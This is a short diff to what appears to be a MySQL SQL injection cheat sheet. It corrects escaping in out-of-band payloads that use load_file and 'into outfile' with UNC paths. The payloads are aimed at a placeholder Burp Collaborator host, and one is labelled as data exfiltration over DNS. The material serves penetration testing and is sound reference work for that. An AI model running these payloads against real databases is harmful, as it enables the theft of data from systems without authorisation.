@@ -41,10 +41,10 @@ Useful SQL commands for mysql dbms
 ## dns lookup
 The following techniques work on Windows only.
 
-`load_file('\\\\YOUR-COLLABORATOR.burpcollaborator.net\\a') select ... into outfile '\\\\YOUR-COLLABORATOR.burpcollaborator.net\'`
+`load_file('\\\\YOUR-COLLABORATOR.burpcollaborator.net\\a') select ... into outfile '\\\\YOUR-COLLABORATOR.burpcollaborator.net\a'`
 
 ## dns lookup with data exfiltration
 The following technique works on Windows only. 
 
-`select YOUR-QUERY-HERE into outfile '\\\\YOUR-COLLABORATOR.burpcollaborator.net\' 
+`select YOUR-QUERY-HERE into outfile '\\\\YOUR-COLLABORATOR.burpcollaborator.net\a' 
 
